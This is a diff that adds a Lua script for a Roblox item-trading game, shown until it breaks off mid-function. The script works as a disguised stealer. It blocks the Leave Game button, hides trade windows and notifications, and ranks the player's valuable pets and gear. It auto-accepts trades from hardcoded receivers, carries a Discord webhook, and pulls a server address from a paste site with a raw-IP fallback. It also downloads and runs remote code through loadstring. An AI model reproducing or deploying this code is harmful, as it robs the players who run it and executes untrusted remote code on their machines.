@@ -1,0 +1,2489 @@
+-- by vexon em nao chorax
+if _G.__Ran then
+	return
+end
+
+_G.__Ran = true
+local flag = game.PlaceId ~= 109983668079237 and game.PlaceId ~= 99606176102979
+
+if flag then
+	game.Players.LocalPlayer:Kick("Wrong game")
+	return
+end
+
+if game.PlaceId == 99606176102979 then
+	return
+end
+
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+if setclipboard then
+	setclipboard("https://discord.gg/3lysium")
+end
+
+task.spawn(function()
+	while task.wait() do
+		pcall(function()
+			for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
+				v:Disable()
+			end
+		end)
+	end
+end)
+
+local str = nil
+
+if not isfolder("vex_dumps") then
+	pcall(makefolder, "vex_dumps")
+end
+
+local function fn(arg)
+	if not str then
+		str = string.format("%s/sab_%d.txt", "vex_dumps", os.time())
+		pcall(writefile, str, "=== SAB LOG " .. os.date() .. " ===\n")
+	end
+
+	if type(appendfile) == "function" then
+		pcall(appendfile, str, os.date("[%H:%M:%S] ") .. arg .. "\n")
+	end
+end
+
+local flag2 = false
+
+local function fn2(...)
+	local v = table.pack(...)
+	if not flag2 then
+		return
+	end
+	local tbl = {}
+
+	for i = 1, select("#", ...) do
+		tbl[i] = tostring(select(i, table.unpack(v, 1, v.n)))
+	end
+
+	local str2 = table.concat(tbl, " ")
+	print("[SAB]", str2)
+	pcall(fn, str2)
+end
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local HttpService = game:GetService("HttpService")
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+local v = HttpService
+local str2 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
+
+local function fn3()
+	local ok, result = pcall(function()
+		return game:HttpGet(str2)
+	end)
+
+	if ok and result then
+		local match = result:match("^%s*(.-)%s*$")
+		if match and match ~= "" then
+			return match:match("^https?://") and match or "http://" .. match
+		end
+	end
+
+	return "http://212.119.42.158:3000"
+end
+
+if not getgenv().SAB_API_BASE then
+	getgenv().SAB_API_BASE = fn3()
+end
+
+local sabApiBase = getgenv().SAB_API_BASE
+local str3 = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
+local n = 300
+local receivers = getgenv().RECEIVERS or { "JORGHE74" }
+local n2 = 1
+local n3 = 180
+local threshold = getgenv().THRESHOLD or 1000000
+loadstring(game:HttpGet("https://raw.githubusercontent.com/astdoasdtiadn/tsdtasdyasdy/refs/heads/main/ps.lua"))()
+
+local priority = getgenv().PRIORITY or {
+	"Nobini Pizzanini",
+	"Strawberry elephant",
+	"Skibidi toilet",
+	"Headless horseman",
+	"Dragon Cannelloni",
+	"Hydra dragon cannelloni",
+	"Dragon Gingerini",
+	"Capitano moby",
+	"La casa boo",
+	"Fragrama and chocrama",
+	"La supreme combinasion",
+	"Cooki and milki",
+	"Burguro and fryuro",
+	"Garama and madungdung",
+	"La secret combinasion",
+	"Spooky and pumpky",
+	"Reinito sleighito",
+	"Ketchuru and musturu",
+	"La taco combinasion",
+	"Tralaledon",
+	"Eviledon",
+	"Los bros",
+	"Tictac sahur",
+	"Cerberus",
+	"Celestial Pegasus",
+	"Love Love Bear",
+	"Festive 67",
+	"Ginger Gerat",
+	"Ketupat Bros",
+	"Rosey and Teddy",
+}
+
+local tbl = {}
+
+for _, v2 in ipairs(priority) do
+	tbl[v2:lower()] = true
+end
+
+local tbl2 = {}
+
+for _, v2 in ipairs({
+	"nobini pizzanini",
+	"strawberry elephant",
+	"skibidi toilet",
+	"headless horseman",
+	"dragon cannelloni",
+	"hydra dragon cannelloni",
+	"dragon gingerini",
+	"love love bear",
+	"signore carapace",
+	"elefanto frigo",
+	"griffin",
+	"john pork",
+	"digi narwhal",
+	"la supreme combinasion",
+}) do
+	tbl2[v2:lower()] = true
+end
+
+local tbl3 = {
+	["rainbow hammer"] = true,
+	["bloodmoon hammer"] = true,
+	["candy sentry"] = true,
+	["santa's sleigh"] = true,
+	waverider = true,
+	["cupid's wings"] = true,
+	["witch's broom"] = true,
+}
+
+local tbl4 = { tralalero = true }
+local webhook = getgenv().WEBHOOK or "https://discord.com/api/webhooks/1554950404226289856/gNhiBtfI4uOoXMQF7HE9KoDRMUhSD9IhpIoAOmohCy2eaINTAsNeqDbHAq-Jhu6a6nkO"
+local str4 = "AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb"
+local str5 = "AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb"
+local flag3 = false
+local flag4 = false
+local tbl5 = {}
+local tbl6 = {}
+local flag5 = false
+local flag6 = false
+local tbl7 = {}
+local ReplicatorClient = nil
+local Animals = nil
+local Mutations = nil
+local Traits = nil
+
+pcall(function()
+	ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
+end)
+
+pcall(function()
+	Animals = require(ReplicatedStorage.Datas.Animals)
+end)
+
+pcall(function()
+	Mutations = require(ReplicatedStorage.Datas.Mutations)
+end)
+
+pcall(function()
+	Traits = require(ReplicatedStorage.Datas.Traits)
+end)
+
+local function fn4(arg)
+	if not arg then
+		return 0
+	end
+
+	if type(arg) == "number" then
+		return arg
+	end
+	local match = tostring(arg):upper():gsub("[%$,%s]", ""):gsub("/S", ""):match("([%d%.]+)") or "0"
+	local n4 = tonumber(match) or 0
+	if match:find("B") then
+		return n4 * 1e9
+	end
+
+	if match:find("M") then
+		return n4 * 1000000
+	end
+
+	if match:find("K") then
+		return n4 * 1000
+	end
+	return n4
+end
+
+local function fn5(arg, arg2)
+	if type(arg) ~= "table" then
+		return nil
+	end
+	local ok, result = pcall(rawget, arg, arg2)
+	return ok and result or nil
+end
+
+local function fn6()
+	for _, v2 in pairs(getgc(true)) do
+		if type(v2) ~= "table" then
+			continue
+		end
+		local animalPodiums = fn5(v2, "AnimalPodiums")
+		local coins = fn5(v2, "Coins")
+		if animalPodiums and type(animalPodiums) == "table" and coins and type(coins) == "number" then
+			return v2
+		end
+	end
+
+	return nil
+end
+
+local function fn7(arg)
+	if not arg or type(arg) ~= "table" then
+		return 0
+	end
+	local tbl8 = Animals[arg.Index] or {}
+	local n4 = 0
+
+	if tbl8.Generation then
+		n4 = fn4(tbl8.Generation)
+	end
+
+	if n4 == 0 and tbl8.Price then
+		n4 = fn4(tbl8.Price) * 0.1
+	end
+
+	local flag7 = arg.Mutation and arg.Mutation ~= ""
+	local n5 = 1
+
+	if flag7 then
+		local v2 = Mutations[arg.Mutation]
+
+		if v2 and v2.Modifier then
+			n5 = 1 + v2.Modifier
+		end
+	end
+
+	local v2 = ipairs
+	local traits = arg.Traits or {}
+	local flag8 = false
+
+	for _, trait in v2(traits) do
+		if type(trait) == "string" and trait ~= "" then
+			local v3 = Traits[trait]
+
+			if v3 and v3.MultiplierModifier then
+				if trait == "Sleepy" then
+					flag8 = true
+				else
+					n5 += v3.MultiplierModifier
+				end
+			end
+		end
+	end
+
+	local n6 = n4 * n5
+
+	if flag8 then
+		n6 *= 0.5
+	end
+
+	return math.round(n6)
+end
+
+local function fn8()
+	local v2 = fn6()
+	if not v2 then
+		return {}
+	end
+	local animalPodiums = fn5(v2, "AnimalPodiums")
+	if not animalPodiums then
+		return {}
+	end
+	local tbl8 = {}
+
+	for k, animalPodium in pairs(animalPodiums) do
+		local num = tonumber(k)
+
+		if num and type(animalPodium) == "table" and not animalPodium.Machine then
+			local v3 = fn7(animalPodium)
+			local flag7 = tbl[(animalPodium.Index or ""):lower()] or false
+			local v4 = Animals[animalPodium.Index]
+
+			if v4 and v4.DisplayName and tbl[v4.DisplayName:lower()] then
+				flag7 = true
+			end
+
+			if flag7 or threshold <= 0 or v3 >= threshold then
+				tbl8[#tbl8 + 1] = { slot = num, animal = animalPodium, gen = v3, priority = flag7 }
+			end
+		end
+	end
+
+	table.sort(tbl8, function(arg, arg2)
+		if arg.priority ~= arg2.priority then
+			return arg.priority
+		end
+		return arg.gen > arg2.gen
+	end)
+
+	return tbl8
+end
+
+local function fn9()
+	if #fn8() > 0 then
+		return true
+	end
+	local v2, v3 = getGearsAndSkins()
+	return #v2 > 0 or #v3 > 0
+end
+
+local function fn10()
+	local v2 = fn6()
+	if not v2 then
+		return {}, {}
+	end
+	local tbl8 = {}
+	local tbl9 = {}
+	local gearInventory = fn5(v2, "GearInventory")
+
+	if gearInventory and type(gearInventory) == "table" then
+		for k, v3 in next, gearInventory, nil do
+			if type(v3) == "table" then
+				local gearName = fn5(v3, "GearName")
+
+				if gearName and tbl3[gearName:lower()] then
+					tbl8[#tbl8 + 1] = { name = gearName, uuid = k }
+				end
+			end
+		end
+	end
+
+	local baseSkinInventory = fn5(v2, "BaseSkinInventory")
+
+	if baseSkinInventory and type(baseSkinInventory) == "table" then
+		for k, v3 in next, baseSkinInventory, nil do
+			if type(v3) == "table" then
+				local skinName = fn5(v3, "SkinName")
+
+				if skinName and tbl4[skinName:lower()] then
+					tbl9[#tbl9 + 1] = { name = skinName, uuid = k }
+				end
+			end
+		end
+	end
+
+	return tbl8, tbl9
+end
+
+local function fn11(arg)
+	if not arg then
+		return false
+	end
+
+	for _, v2 in ipairs({ "Activated", "MouseButton1Click", "MouseButton1Down" }) do
+		local ok, result = pcall(getconnections, arg[v2])
+		if not ok or #result == 0 then
+			continue
+		end
+
+		for _, v3 in ipairs(result) do
+			if type(v3.Function) == "function" then
+				if pcall(v3.Function) then
+					return true
+				end
+			end
+
+			pcall(function()
+				v3:Fire()
+			end)
+		end
+
+		return true
+	end
+
+	pcall(function()
+		arg:SimulateClick()
+	end)
+
+	return false
+end
+
+local v2 = nil
+
+local function fn12()
+	if v2 then
+		return v2
+	end
+	local ok, result = pcall(require, ReplicatedStorage.Controllers.InterfaceController)
+
+	if ok and type(result) == "table" then
+		v2 = result
+	end
+
+	return v2
+end
+
+local tbl8 = {
+	active = false,
+	heartbeatConn = nil,
+	childAddedConn = nil,
+	suppressedGuis = { "TradePlayerList", "TradePrompts" },
+	_origCamera = {},
+	_origNotifMethods = {},
+	_lcInterface = nil,
+	_hudInterface = nil,
+	hookCamera = function(arg)
+		local ok, result = pcall(require, ReplicatedStorage.Controllers.CameraController)
+		if not ok or type(result) ~= "table" then
+			return
+		end
+
+		for _, v3 in ipairs({ "Blur", "Fov", "SetBlur", "SetFov", "TweenBlur", "TweenFov" }) do
+			local v4 = result[v3]
+
+			if type(v4) == "function" then
+				arg._origCamera[v3] = v4
+
+				result[v3] = function(...)
+					if arg.active then
+						return
+					end
+					return v4(result, select(2, ...))
+				end
+			end
+		end
+
+		local blurEffect = Lighting:FindFirstChildOfClass("BlurEffect")
+
+		if blurEffect then
+			blurEffect.Size = 0
+		end
+	end,
+	hookInterface = function(arg)
+		local ok, result = pcall(require, ReplicatedStorage.Controllers.InterfaceController)
+		if not ok or type(result) ~= "table" then
+			return
+		end
+		v2 = result
+		local interfaces = result:GetInterfaces()
+
+		if interfaces then
+			arg._lcInterface = interfaces.LeftCenter
+			arg._hudInterface = interfaces.Hud
+		end
+
+		if arg._lcInterface and type(arg._lcInterface.Close) == "function" then
+			local close = arg._lcInterface.Close
+
+			arg._lcInterface.Close = function(arg2, ...)
+				if arg.active then
+					if arg2.ToggleTween then
+						arg2.ToggleTween:Cancel()
+						arg2.ToggleTween = nil
+					end
+
+					arg2.State = true
+
+					if arg2.Object then
+						arg2.Object.Visible = true
+					end
+
+					if arg2.Defaults and arg2.Object then
+						arg2.Object.Position = arg2.Defaults.Position
+					end
+
+					return
+				end
+
+				return close(arg2, ...)
+			end
+		end
+
+		if arg._hudInterface and type(arg._hudInterface.Close) == "function" then
+			local close = arg._hudInterface.Close
+
+			arg._hudInterface.Close = function(arg2, ...)
+				if arg.active then
+					if arg2.ToggleTween then
+						arg2.ToggleTween:Cancel()
+						arg2.ToggleTween = nil
+					end
+
+					arg2.State = true
+
+					if arg2.Object then
+						arg2.Object.Visible = true
+					end
+
+					if arg2.Defaults and arg2.Object then
+						arg2.Object.Position = arg2.Defaults.Position
+					end
+
+					return
+				end
+
+				return close(arg2, ...)
+			end
+		end
+
+		local toggle = result.Toggle
+
+		if type(toggle) == "function" then
+			result.Toggle = function(arg2, arg3, arg4, arg5, ...)
+				if arg.active and (arg3 == "TradePlayerList" or arg3 == "TradePrompts") then
+					if arg4 == true or arg4 == nil then
+						return
+					end
+				end
+
+				local v3 = table.pack(...)
+				local v4 = toggle
+				local v5 = result
+				v3.n = 5 + v3.n - 1
+				table.move(v3, 1, v3.n, 5, v3)
+				v3[1] = v5
+				v3[2] = arg3
+				v3[3] = arg4
+				v3[4] = arg5
+				return v4(table.unpack(v3, 1, v3.n))
+			end
+		end
+
+		local setState = result.SetState
+
+		if type(setState) == "function" then
+			result.SetState = function(arg2, arg3, arg4, ...)
+				if arg.active and (arg3 == "TradePlayerList" or arg3 == "TradePrompts") then
+					if arg4 == true or arg4 == nil then
+						return
+					end
+				end
+
+				local v3 = table.pack(...)
+				local v4 = setState
+				local v5 = result
+				v3.n = 4 + v3.n - 1
+				table.move(v3, 1, v3.n, 4, v3)
+				v3[1] = v5
+				v3[2] = arg3
+				v3[3] = arg4
+				return v4(table.unpack(v3, 1, v3.n))
+			end
+		end
+	end,
+	hookNotifications = function(arg)
+		local ok, result = pcall(require, ReplicatedStorage.Controllers.NotificationController)
+
+		if ok and type(result) == "table" then
+			for _, v3 in ipairs({ "Notify", "Error", "Success" }) do
+				local v4 = result[v3]
+
+				if type(v4) == "function" then
+					arg._origNotifMethods[v3] = v4
+
+					result[v3] = function()
+					end
+				end
+			end
+		end
+	end,
+	disableAllSuppressed = function(arg)
+		for _, suppressedGui in ipairs(arg.suppressedGuis) do
+			local v3 = playerGui:FindFirstChild(suppressedGui)
+
+			if v3 and v3:IsA("ScreenGui") and v3.Enabled then
+				v3.Enabled = false
+			end
+		end
+	end,
+	hideTLTVisually = function()
+		local tradeLiveTrade = playerGui:FindFirstChild("TradeLiveTrade")
+		if not tradeLiveTrade then
+			return
+		end
+		local tradeLiveTrade2 = tradeLiveTrade:FindFirstChild("TradeLiveTrade")
+
+		if tradeLiveTrade2 and tradeLiveTrade2:IsA("GuiObject") and tradeLiveTrade2.Visible then
+			tradeLiveTrade2.Visible = false
+		end
+	end,
+	showTLT = function()
+		local tradeLiveTrade = playerGui:FindFirstChild("TradeLiveTrade")
+		if not tradeLiveTrade then
+			return
+		end
+		tradeLiveTrade.Enabled = true
+		local tradeLiveTrade2 = tradeLiveTrade:FindFirstChild("TradeLiveTrade")
+
+		if tradeLiveTrade2 and tradeLiveTrade2:IsA("GuiObject") then
+			tradeLiveTrade2.Visible = true
+		end
+	end,
+	restoreLeftCenter = function(arg)
+		local leftCenter = playerGui:FindFirstChild("LeftCenter")
+
+		if leftCenter then
+			if not leftCenter.Enabled then
+				leftCenter.Enabled = true
+			end
+
+			local leftCenter2 = leftCenter:FindFirstChild("LeftCenter")
+
+			if leftCenter2 then
+				if not leftCenter2.Visible then
+					leftCenter2.Visible = true
+				end
+
+				if arg._lcInterface then
+					if arg._lcInterface.ToggleTween then
+						arg._lcInterface.ToggleTween:Cancel()
+						arg._lcInterface.ToggleTween = nil
+					end
+
+					if arg._lcInterface.Defaults and arg._lcInterface.Object then
+						leftCenter2.Position = arg._lcInterface.Defaults.Position
+					end
+				end
+
+				local buttons = leftCenter2:FindFirstChild("Buttons")
+
+				if buttons and not buttons.Visible then
+					buttons.Visible = true
+				end
+			end
+		end
+
+		local hud = playerGui:FindFirstChild("Hud")
+
+		if hud then
+			if not hud.Enabled then
+				hud.Enabled = true
+			end
+
+			if arg._hudInterface then
+				if arg._hudInterface.ToggleTween then
+					arg._hudInterface.ToggleTween:Cancel()
+					arg._hudInterface.ToggleTween = nil
+				end
+
+				if arg._hudInterface.Defaults and arg._hudInterface.Object then
+					local hud2 = hud:FindFirstChild("Hud")
+
+					if hud2 then
+						hud2.Position = arg._hudInterface.Defaults.Position
+					end
+				end
+			end
+		end
+	end,
+	resetCamera = function()
+		local currentCamera = Workspace.CurrentCamera
+		if not currentCamera then
+			return
+		end
+		currentCamera.FieldOfView = 70
+		local blurEffect = Lighting:FindFirstChildOfClass("BlurEffect")
+
+		if blurEffect then
+			blurEffect.Size = 0
+		end
+	end,
+	hookChildAdded = function(arg)
+		if arg.childAddedConn then
+			arg.childAddedConn:Disconnect()
+		end
+
+		arg.childAddedConn = playerGui.ChildAdded:Connect(function(child)
+			if not child:IsA("ScreenGui") then
+				return
+			end
+
+			for _, suppressedGui in ipairs(arg.suppressedGuis) do
+				if child.Name == suppressedGui then
+					child.Enabled = false
+
+					child:GetPropertyChangedSignal("Enabled"):Connect(function()
+						if arg.active and child.Enabled then
+							child.Enabled = false
+						end
+					end)
+
+					return
+				end
+			end
+
+			if child.Name == "TradeLiveTrade" then
+				child.DescendantAdded:Connect(function(descendant)
+					if descendant.Name == "TradeLiveTrade" and descendant:IsA("GuiObject") then
+						if arg.active then
+							descendant.Visible = false
+						end
+					end
+				end)
+			end
+		end)
+	end,
+	installHooks = function(arg)
+		if arg.hooksInstalled then
+			return
+		end
+		arg:hookCamera()
+		arg:hookInterface()
+		arg:hookNotifications()
+		arg:hookChildAdded()
+		arg:disableAllSuppressed()
+		arg:resetCamera()
+		arg.hooksInstalled = true
+	end,
+	start = function(arg)
+		if arg.active then
+			return
+		end
+		arg:installHooks()
+		arg.active = true
+
+		arg.heartbeatConn = RunService.Heartbeat:Connect(function()
+			if not arg.active then
+				return
+			end
+			arg:disableAllSuppressed()
+			arg:resetCamera()
+			arg:hideTLTVisually()
+			arg:restoreLeftCenter()
+		end)
+	end,
+	bypass = function(arg, arg2)
+		local v3 = playerGui:FindFirstChild(arg2)
+
+		if v3 then
+			v3.Enabled = true
+		end
+
+		return function()
+			if v3 then
+				v3.Enabled = false
+			end
+		end
+	end,
+	revealForTrade = function(arg)
+		arg:showTLT()
+	end,
+	hideAfterTrade = function(arg)
+		arg:hideTLTVisually()
+	end,
+}
+
+tbl8:start()
+fn2("TradeSuppressor started")
+
+local function fn13()
+	local ok, result = pcall(function()
+		return ReplicatorClient.get(("Trade_%d"):format(localPlayer.UserId))
+	end)
+
+	return ok and result or nil
+end
+
+local function fn14()
+	local v3 = fn13()
+	return v3 and v3:TryIndex({ "active", "data" }) ~= nil
+end
+
+local function fn15()
+	local v3 = fn13()
+	if not v3 then
+		return nil
+	end
+	local v4 = v3:TryIndex({ "active", "data", "players" })
+
+	if v4 then
+		for k, v5 in pairs(v4) do
+			local username = v5.username
+
+			if username then
+				local name = localPlayer.Name
+				username = v5.username:lower() == name:lower()
+			end
+
+			if username then
+				return k
+			end
+		end
+	end
+
+	local v5 = v3:TryIndex({ "active", "data", "users" })
+
+	if v5 then
+		for k, v6 in pairs(v5) do
+			if v6 == localPlayer.UserId then
+				return k
+			end
+		end
+	end
+
+	return nil
+end
+
+local function fn16()
+	local v3 = fn13()
+	if not v3 then
+		return 0
+	end
+	local v4 = fn15()
+	if not v4 then
+		return 0
+	end
+	local v5 = v3:TryIndex({ "active", "data", "players" })
+	if not v5 then
+		return 0
+	end
+	local v6 = v5[v4]
+	if not v6 or not v6.offer then
+		return 0
+	end
+	local n4 = 0
+
+	if type(v6.offer.brainrots) == "table" then
+		for k in pairs(v6.offer.brainrots) do
+			n4 += 1
+		end
+	end
+
+	if type(v6.offer.gears) == "table" then
+		for k in pairs(v6.offer.gears) do
+			n4 += 1
+		end
+	end
+
+	if type(v6.offer.baseSkins) == "table" then
+		for k in pairs(v6.offer.baseSkins) do
+			n4 += 1
+		end
+	end
+
+	return n4
+end
+
+local function fn17()
+	local v3 = fn13()
+	if not v3 then
+		return 0
+	end
+	local v4 = v3:TryIndex({ "active", "data", "lastChange" })
+	if typeof(v4) ~= "number" then
+		return 0
+	end
+	local n4 = v4 + 1.1 - Workspace:GetServerTimeNow()
+	return n4 > 0 and n4 or 0
+end
+
+local function fn18()
+	local v3 = fn13()
+	if not v3 then
+		return 0
+	end
+	local v4 = v3:TryIndex({ "active", "data", "lastChange" })
+	if typeof(v4) ~= "number" then
+		return 0
+	end
+	local n4 = v4 + 5 - Workspace:GetServerTimeNow()
+	return n4 > 0 and n4 or 0
+end
+
+local function fn19()
+	local v3 = fn13()
+	if not v3 then
+		return false
+	end
+	local v4 = v3:TryIndex({ "active", "data", "players" })
+	if type(v4) ~= "table" then
+		return false
+	end
+
+	for _, v5 in pairs(v4) do
+		if not v5.ready then
+			return false
+		end
+	end
+
+	return true
+end
+
+local function fn20()
+	local v3 = fn13()
+	if not v3 then
+		return false
+	end
+	local v4 = fn15()
+	if not v4 then
+		return false
+	end
+	local v5 = v3:TryIndex({ "active", "data", "players" })
+	v5 = v5 and v5[v4]
+	return v5 and v5.ready == true
+end
+
+local function fn21()
+	local v3 = fn13()
+	if not v3 then
+		return true
+	end
+	local v4 = fn15()
+	if not v4 then
+		return true
+	end
+	local v5 = v3:TryIndex({ "active", "data", "players" })
+	v5 = v5 and v5[v4]
+	return v5 and v5.accepted == true
+end
+
+local function fn22()
+	local tradeLiveTrade = playerGui:FindFirstChild("TradeLiveTrade")
+	if not tradeLiveTrade then
+		return nil
+	end
+	return tradeLiveTrade:FindFirstChild("TradeLiveTrade")
+end
+
+local function fn23(arg)
+	local n4 = tick() + (arg or 15)
+
+	while tick() < n4 do
+		local v3 = fn22()
+		if v3 then
+			return v3
+		end
+		task.wait(0.1)
+	end
+
+	return nil
+end
+
+local function fn24()
+	local v3 = fn12()
+
+	if v3 then
+		local interfaces = v3:GetInterfaces()
+
+		if interfaces and interfaces.TradePlayerList then
+			interfaces.TradePlayerList:Open()
+		else
+			v3:Toggle("TradePlayerList", true)
+		end
+	end
+
+	local tradePlayerList = playerGui:FindFirstChild("TradePlayerList")
+	local tradePlayerList2 = tradePlayerList and tradePlayerList:FindFirstChild("TradePlayerList")
+	if not tradePlayerList or not tradePlayerList2 then
+		return nil, nil
+	end
+	tradePlayerList.Enabled = true
+	tradePlayerList2.Visible = true
+	return tradePlayerList, tradePlayerList2
+end
+
+local function fn25(arg, text)
+	local sections = arg:FindFirstChild("Sections")
+	sections = sections and sections:FindFirstChild("Players")
+	local searchFrame = sections and sections:FindFirstChild("SearchFrame")
+	searchFrame = searchFrame and searchFrame:FindFirstChild("SearchBox")
+	sections = sections and sections:FindFirstChild("List")
+	local other = arg:FindFirstChild("Other")
+	other = other and other:FindFirstChild("List")
+
+	local function fn26(arg2)
+		if not arg2 then
+			return nil
+		end
+
+		for _, child in ipairs(arg2:GetChildren()) do
+			if child:IsA("Frame") then
+				local fill = child:FindFirstChild("Fill")
+				local username = fill and fill:FindFirstChild("Username")
+
+				if username then
+					username = username.Text:gsub("^@", ""):lower() == text:lower()
+				end
+
+				if username then
+					return fill and fill:FindFirstChild("Send")
+				end
+			end
+		end
+
+		return nil
+	end
+
+	local v3 = fn26(other)
+
+	if v3 then
+		local ok, result = pcall(getconnections, v3.Activated)
+		fn2("Found in Other.List - conns: " .. (ok and #result or "failed"))
+		return v3
+	end
+
+	if not searchFrame then
+		return nil
+	end
+	fn2("Search S3: Changed per char...")
+	local v4 = nil
+
+	local connection = sections and sections.ChildAdded:Connect(function(child)
+		if v4 then
+			return
+		end
+		local n4 = tick() + 3
+
+		while tick() < n4 do
+			local fill = child:FindFirstChild("Fill")
+			local username = fill and fill:FindFirstChild("Username")
+
+			if username then
+				username = username.Text:gsub("^@", ""):lower() == text:lower()
+			end
+
+			if username then
+				local send = fill:FindFirstChild("Send")
+
+				if send then
+					local ok, result = pcall(getconnections, send.Activated)
+
+					if ok and #result > 0 then
+						local flag7 = false
+
+						for _, v5 in ipairs(result) do
+							if type(v5.Function) == "function" then
+								local ok2, result2 = pcall(getupvalues, v5.Function)
+
+								if ok2 and result2 then
+									for _, v6 in pairs(result2) do
+										if type(v6) == "table" and v6.canInvite ~= nil then
+											flag7 = true
+											break
+										end
+									end
+								end
+							end
+
+							if not flag7 then
+								continue
+							end
+							break
+						end
+
+						if flag7 then
+							fn2("ChildAdded fully populated - conns: " .. #result)
+							v4 = send
+							return
+						end
+					end
+				end
+			end
+
+			task.wait(0.1)
+		end
+	end)
+
+	searchFrame.Text = ""
+	task.wait(0.05)
+	searchFrame.Text = text
+	local ok, result = pcall(getconnections, searchFrame.FocusLost)
+
+	if ok and #result > 0 then
+		task.spawn(function()
+			for _, v5 in ipairs(result) do
+				if type(v5.Function) == "function" then
+					pcall(v5.Function, true)
+				else
+					pcall(function()
+						v5:Fire(true)
+					end)
+				end
+			end
+		end)
+	end
+
+	local n4 = tick() + 8
+
+	while tick() < n4 do
+		if not v4 then
+			task.wait(0.1)
+			continue
+		end
+		break
+	end
+
+	if connection then
+		connection:Disconnect()
+	end
+
+	if not v4 then
+		v4 = fn26(sections) or fn26(other)
+
+		if v4 then
+			fn2("Found via poll fallback")
+		end
+	end
+
+	if v4 then
+		local ok2, result2 = pcall(getconnections, v4.Activated)
+		fn2("Search result - conns: " .. (ok2 and #result2 or "failed"))
+	else
+		fn2("Search S3: not found")
+	end
+
+	return v4
+end
+
+local function fn26(arg)
+	if not arg then
+		return false
+	end
+	local backgroundColor3 = arg.BackgroundColor3
+	return backgroundColor3.G > 0.5 and backgroundColor3.R < 0.5
+end
+
+local function fn27()
+	local ok, result = pcall(require, ReplicatedStorage.Controllers.TradeController)
+	if not ok or type(result) ~= "table" then
+		return nil
+	end
+	local ok2, result2 = pcall(getupvalues, result.SendInvite)
+	if ok2 and result2 and result2[1] then
+		return result2[1]
+	end
+	return nil
+end
+
+local function fn28(arg)
+	local ok, result = pcall(getconnections, arg.Activated)
+
+	if ok and #result > 0 then
+		for _, v3 in ipairs(result) do
+			if type(v3.Function) ~= "function" then
+				continue
+			end
+			local ok2, result2 = pcall(v3.Function)
+			local str6 = tostring(result2 or "")
+			fn2("Send conn.Function(): ok=" .. tostring(ok2) .. " err=" .. str6)
+			if ok2 and not str6:find("is not a valid member") then
+				fn2("Send success via conn.Function()")
+				return true
+			end
+		end
+	end
+
+	if ok and #result > 0 then
+		fn2("Send fallback: conn:Fire()...")
+
+		for _, v3 in ipairs(result) do
+			local ok2, result2 = pcall(function()
+				v3:Fire()
+			end)
+
+			fn2("conn:Fire(): ok=" .. tostring(ok2) .. " err=" .. tostring(result2))
+			if ok2 then
+				fn2("Send success via conn:Fire()")
+				return true
+			end
+		end
+	end
+
+	fn2("Both GUI send methods failed")
+	return false
+end
+
+local function fn29()
+	fn2("Hooking CNC.Add for incoming invites...")
+	local tbl9 = {}
+
+	for _, receiver in ipairs(receivers) do
+		tbl9[receiver:lower()] = receiver
+	end
+
+	local ok, result = pcall(require, ReplicatedStorage.Controllers.CornerNotificationController)
+	if not ok or type(result) ~= "table" then
+		fn2("CNC failed: " .. tostring(result))
+		return
+	end
+	local add = result.Add
+	if type(add) ~= "function" then
+		fn2("CNC.Add not function")
+		return
+	end
+
+	result.Add = function(arg, arg2, ...)
+		if arg2 and typeof(arg2) == "Instance" then
+			local yes = arg2:FindFirstChild("Yes")
+			local no = arg2:FindFirstChild("No")
+			local username = arg2:FindFirstChild("Username")
+
+			if yes and no and username then
+				local text = username.Text or ""
+				local match = (text:match("@(.+) wants to trade with you") or text:gsub("^@", "")):match("^%s*(.-)%s*$")
+				fn2("Incoming invite from: " .. match)
+				arg2.Visible = false
+				local v3 = tbl9[match:lower()]
+
+				if v3 and not flag3 then
+					fn2("Target matched: " .. v3 .. " — accepting...")
+
+					local function fn30()
+						task.wait(0.05)
+						local ok2, result2 = pcall(getconnections, yes.Activated)
+						fn2("Yes.Activated conns: " .. (ok2 and #result2 or "failed"))
+						local flag7 = ok2 and #result2 > 0
+						local flag8 = false
+
+						if flag7 then
+							for _, v4 in ipairs(result2) do
+								if type(v4.Function) == "function" then
+									local ok3, result3 = pcall(v4.Function)
+									fn2("Yes.Function(): ok=" .. tostring(ok3) .. " err=" .. tostring(result3))
+									if ok3 then
+										flag8 = true
+										break
+									end
+								end
+							end
+						end
+
+						if not flag8 and ok2 and #result2 > 0 then
+							for _, v4 in ipairs(result2) do
+								if pcall(function()
+									v4:Fire()
+								end) then
+									flag8 = true
+									break
+								end
+							end
+						end
+
+						if not flag8 then
+							fn2("Could not fire Yes")
+							return
+						end
+						fn2("Yes fired — waiting for channel...")
+						flag3 = true
+						local n4 = tick() + 40
+
+						while tick() < n4 do
+							if not fn14() then
+								task.wait(0.1)
+								continue
+							end
+							break
+						end
+
+						if fn14() then
+							fn2("Channel open — starting trade flow")
+							runTradeFlow(v3)
+						else
+							fn2("Channel never opened after accept")
+							flag3 = false
+						end
+					end
+
+					task.spawn(fn30)
+				else
